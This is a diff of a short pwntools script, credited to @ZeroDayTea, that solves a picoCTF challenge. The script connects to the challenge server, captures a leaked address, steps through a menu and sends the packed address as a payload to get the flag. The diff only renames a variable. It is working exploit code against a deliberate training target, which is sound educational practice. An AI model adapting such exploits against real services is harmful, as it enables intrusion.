@@ -1,23 +1,23 @@
 # Credits to @ZeroDayTea
 from pwn import *
 
-io = remote('mercury.picoctf.net', 4504)  # replace with your port
+r = remote('mercury.picoctf.net', 4504)  # replace with your port
 
-io.recvuntil("it\n")
-io.sendline('s')
-io.recvuntil("...")
+r.recvuntil("it\n")
+r.sendline('s')
+r.recvuntil("...")
 
-payload = p32(int(io.recvline().strip(), 16))
+payload = p32(int(r.recvline().strip(), 16))
 
-io.recvuntil("it\n")
-io.sendline('i')
-io.recvuntil('?')
-io.sendline('y')
+r.recvuntil("it\n")
+r.sendline('i')
+r.recvuntil('?')
+r.sendline('y')
 
-io.recvuntil("it\n")
-io.sendline('l')
-io.recvline()
-io.sendline(payload)
+r.recvuntil("it\n")
+r.sendline('l')
+r.recvline()
+r.sendline(payload)
 
-io.recvuntil(':\n')
-print(io.recvline().strip().decode())
+r.recvuntil(':\n')
+print(r.recvline().strip().decode())
